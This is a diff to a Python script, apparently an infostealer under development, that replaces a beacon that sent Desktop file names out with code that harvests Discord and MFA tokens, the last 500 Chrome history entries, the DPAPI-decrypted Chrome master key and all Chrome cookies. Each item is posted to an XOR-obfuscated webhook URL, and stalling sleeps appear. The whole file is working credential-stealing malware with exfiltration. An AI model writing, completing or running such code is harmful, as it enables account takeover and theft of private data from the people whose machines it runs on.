@@ -1,38 +1,147 @@
-import os
-import requests
 import time
+import os
+import re
+import sqlite3
+import shutil
+import requests
+import win32crypt  # Part of pywin32
+import base64
+import json
 
-### VARIABLES
+key = "Impossible"
+Encrypted_URL = bytes([33, 25, 4, 31, 0, 73, 70, 77, 8, 12, 58, 14,]) #This is the encrypted webhook URL dw aboout this
+#Redacted
 
-PS1 = 1539495863945  #signatures alerting
-PS2 = 5584359435856
-
-key = "random"
-encrypted_url = bytes([33, 25, 4, 31, 0, 73, 70, 77, 8, 12, 58, 14, 31, 29, 23, 93, 10, 13, 1, 74, 40, 83, 121, 93, 95, 25, 11, 3, 48, 42, 46, 10, 38, 61, 47, 34, 6, 6, 29, 81, 95, 33, 35, 16, 53, 90, 6, 54, 1, 57, 0, 5, 26, 33, 42, 63, 59, 36, 34, 17, 3, 71, 21, 53, 68, 54, 19, 7, 45, 49, 9, 62, 55, 23, 58, 25, 52, 22, 86, 120]) #This is the encrypted webhook URL dw aboout this
-desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-file_list = "\n".join(os.listdir(desktop_path))
-
-data = {
-    "content" : f"Boot up successful!\n Files: {file_list}"
-}
-
-
-def boot_up(paramchecker, paramidentifier):
-    if paramchecker == paramidentifier:
+def firsthing(a, b):
+    if a == b:
         time.sleep(10)
     else:
         time.sleep(10)
 
 
-
-def xor_decrypt(enc_bytes1, enc_key):
+def xor_decryption(enc_url, dec_key):
     temp = bytearray()
-    key_byte = enc_key.encode()
-    for i in range(len(enc_bytes1)):
-        temp.append((enc_bytes1[i] ^ key_byte[i % len(key_byte)]))
+    keybyte = dec_key.encode()
+    for i in range(0, len(enc_url)):
+        temp.append(enc_url[i] ^ keybyte[i % len(keybyte)])
     return temp.decode()
-        
 
-for i in range(0, 3):
-    boot_up(1, 1)
-requests.post(xor_decrypt(encrypted_url, key), json=data)
+
+def send_data(message):
+    data = {
+        "content" : message
+    }
+    requests.post(xor_decryption(Encrypted_URL, key), json=data)
+
+
+def get_discord_token():
+    paths = [
+        os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb\\',
+        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb\\',
+        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb\\',
+    ]
+
+    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
+    mfa_regex = re.compile(r"mfa\.[\w-]{84}")
+
+    tokens_found = []
+
+    for path in paths:
+        if not os.path.exists(path):
+            continue
+        for filename in os.listdir(path):
+            if not filename.endswith(('.log', '.ldb')):
+                continue
+            with open(path + filename, 'r', errors='ignore') as file:
+                for line in file:
+                    for token in token_regex.findall(line):
+                        tokens_found.append(token)
+                    for mfa in mfa_regex.findall(line):
+                        tokens_found.append(mfa)
+
+    return list(set(tokens_found))  # remove duplicates
+
+tokens = get_discord_token()
+    
+send_data(f"Discord tokens from local machine: {tokens}")
+
+
+
+def extract_chrome_history():
+    history_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\History")
+    tmp_history = "History_temp.db"
+
+    # Copy database to avoid 'locked' errors
+    try:
+        shutil.copy2(history_path, tmp_history)
+    except Exception as e:
+        send_data(f"Error copying history DB: {e}")
+        return
+
+    try:
+        conn = sqlite3.connect(tmp_history)
+        conn.text_factory = bytes
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500;")
+
+        rows = cursor.fetchall()
+        send_data("\n Last 500 Browsing History Entries:\n")
+        for url, title, visits, last_time in rows:
+            send_data(f"Title: {title}\nURL: {url}\nVisits: {visits}\n---")
+
+        conn.close()
+        os.remove(tmp_history)
+
+    except Exception as e:
+        send_data(f"Error reading history DB: {e}")
+
+extract_chrome_history()
+
+
+
+
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    
+    send_data("Chrome Master Key (decrypted):", decrypted_key.hex())
+    return decrypted_key
+
+
+def extract_all_encrypted_cookies():
+    key = get_encryption_key()
+
+    db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Network\Cookies")
+    temp_db = "chrome_cookies_temp.db"
+
+    try:
+        shutil.copy2(db_path, temp_db)
+    except Exception as e:
+        send_data(f"[!] Error copying cookie DB: {e}")
+        return
+
+    try:
+        conn = sqlite3.connect(temp_db)
+        conn.text_factory = bytes  # Avoid UTF-8 decoding issues
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        rows = cursor.fetchall()
+
+        send_data("\nAll Encrypted Chrome Cookies:\n")
+        for host, name, encrypted in rows:
+            send_data(f"[{host.decode(errors='ignore')}] {name.decode(errors='ignore')} = {encrypted.hex()}")
+
+        conn.close()
+        os.remove(temp_db)
+
+    except Exception as e:
+        send_data(f"[!] Error reading cookie DB: {e}")
+
+extract_all_encrypted_cookies()
